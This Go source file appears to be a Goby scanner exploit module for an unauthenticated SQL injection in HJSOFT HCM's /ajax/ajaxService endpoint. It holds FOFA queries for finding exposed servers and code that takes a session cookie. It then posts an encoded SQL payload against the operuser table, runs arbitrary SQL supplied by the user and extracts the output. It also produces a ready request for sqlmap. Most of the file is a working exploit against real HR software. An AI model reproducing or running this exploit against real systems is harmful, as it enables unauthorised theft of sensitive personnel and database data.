package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "HJSOFT HCM system  /ajax/ajaxService SQL Injection Vulnerability",
    "Description": "<p>HJSOFT HCM system is a system developed by Hongjing software. Its main functions include the management of personnel, organization, files, contracts, salaries, insurance, performance, attendance, recruitment, training, cadre appointment and removal, personnel process and other business, as well as personnel, performance, training, recruitment, attendance and other business self-help, and it also has report function and flexible form tools. Support group control, management by objectives, leadership decision-making and other applications. </p><p> SQL injection vulnerability exists in ajaxService of HJSOFT HCM system. Remote attackers without authentication can use this vulnerability to execute arbitrary SQL commands and steal sensitive database information.</p>",
    "Product": "HJSOFT HCM",
    "Homepage": "http://www.hjsoft.com.cn/",
    "DisclosureDate": "2023-08-05",
    "PostTime": "2024-07-30",
    "Author": "1215816861@qq.com",
    "FofaQuery": "body=\"hjaxmanage.js\" && (body=\"/template/signature/encryptionlock/websocket.js\" || body=\"/ajax/basic.js\")",
    "GobyQuery": "body=\"hjaxmanage.js\" && (body=\"/template/signature/encryptionlock/websocket.js\" || body=\"/ajax/basic.js\")",
    "Level": "2",
    "Impact": "<p> SQL injection vulnerability exists in ajaxService of HJSOFT HCM system. Remote attackers without authentication can use this vulnerability to execute arbitrary SQL commands and steal sensitive database information.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer'shomepage update: <a href=\"http://www.hjsoft.com.cn/\">http://www.hjsoft.com.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select~20sys.fn_sqlvarbasetostr(HASHBYTES('MD5','12345'))",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.6",
    "Translation": {
        "CN": {
            "Name": "宏景人力资源信息管理系统  /ajax/ajaxService SQL 注入漏洞",
            "Product": "宏景HCM",
            "Description": "<p>宏景HCM系统是一款由宏景软件研发的系统，主要功能包括人员、组织机构、档案、合同、薪资、保险、绩效、考勤、招聘、培训、干部任免和人事流程等业务的管理，以及人事、绩效、培训、招聘、考勤等业务自助，还具备了报表功能和灵活的表格工具，支持集团管控、目标管理、领导决策等应用。&nbsp;</p><p>&nbsp;宏景HCM系统 ajaxService处存在SQL注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.hjsoft.com.cn/\">http://www.hjsoft.com.cn/</a>&nbsp;</p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>宏景HCM系统 ajaxService处存在SQL注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "HJSOFT HCM system  /ajax/ajaxService SQL Injection Vulnerability",
            "Product": "HJSOFT HCM",
            "Description": "<p>HJSOFT HCM system is a system developed by Hongjing software. Its main functions include the management of personnel, organization, files, contracts, salaries, insurance, performance, attendance, recruitment, training, cadre appointment and removal, personnel process and other business, as well as personnel, performance, training, recruitment, attendance and other business self-help, and it also has report function and flexible form tools. Support group control, management by objectives, leadership decision-making and other applications.&nbsp;</p><p>&nbsp;SQL injection vulnerability exists in ajaxService of HJSOFT HCM system. Remote attackers without authentication can use this vulnerability to execute arbitrary SQL commands and steal sensitive database information.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer'shomepage update:&nbsp;<a href=\"http://www.hjsoft.com.cn/\">http://www.hjsoft.com.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>&nbsp;SQL injection vulnerability exists in ajaxService of HJSOFT HCM system. Remote attackers without authentication can use this vulnerability to execute arbitrary SQL commands and steal sensitive database information.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10984"
}`

	setSqlPayloadHash_AfsdfeA1718ds6102d37 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, cookie string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = data
			PostRequest.Header.Store("Cookie", cookie)
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		urlget1 := `/templates/index/getpassword.jsp`
		urlget2 := `/ajax/ajaxService`

		data := `__type=extTrans&__xml=%7B%22functionId%22%3A%22151211001137%22%2C%22sql%22%3A%22` + sql + `~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser%22%2C%22nbase%22%3A%221%22%7D`

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Content-Type":    "application/x-www-form-urlencoded",
		}

		makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			reRequest := regexp.MustCompile(RegularUrl)
			if !reRequest.MatchString(RegularContent) {
				return "", fmt.Errorf("can't match value")
			}
			getname := reRequest.FindStringSubmatch(RegularContent)
			return getname[1], nil
		}

		resp1, err1 := setGetRequest(hostInfo, urlget1, header)
		if err1 != nil || resp1.StatusCode != 200 {
			return resp1, "", err1
		}
		regular1 := `Set-Cookie: (.*?);`
		cookie, _ := makeRegular(resp1.HeaderString.String(), regular1)

		resp2, err2 := setPostRequest(hostInfo, urlget2, data, cookie, header)
		if err2 != nil || resp2.StatusCode != 200 {
			return resp2, "", err2
		}

		//配置漏洞存在的路径
		vulurl = "/ajax/ajaxService"

		return resp2, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "827ccb0eea8a706c4c34a16891f84e7b"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `select~20sys.fn_sqlvarbasetostr(HASHBYTES('MD5','12345'))`

			sendPayload := setSqlPayloadHash_AfsdfeA1718ds6102d37
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			// 1.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /ajax/ajaxService HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\nAccept-Encoding: gzip, deflate, br\nConnection: close\r\n\r\n__type=extTrans&__xml=%7B%22functionId%22%3A%22151211001137%22%2C%22sql%22%3A%22select~20sys.fn_sqlvarbasetostr(HASHBYTES('MD5','12345'))~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser%22%2C%22nbase%22%3A%221%22%7D"

			// 2.配置正则语句，从响应包中提取出数据
			regular := "\"listvalue\":\\[\"([\\s\\S]*?)`1"

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHash_AfsdfeA1718ds6102d37
			attacktype := goutils.B2S(ss.Params["attackType"])
			switch attacktype {

			case "sql":
				sql := goutils.B2S(ss.Params["sql"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed` + err.Error()
					expResult.Success = false
					return expResult
				}

				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "Exploitation failed "
					return expResult
				}
				expResult.Success = true
				expResult.Output = output

			case "sqlpoint":
				expResult.Success = true
				expResult.Output = sqlpoint

			default:
				expResult.Success = false
				expResult.Output = "Unknown attack type"

			}
			return expResult
		},
	))
}
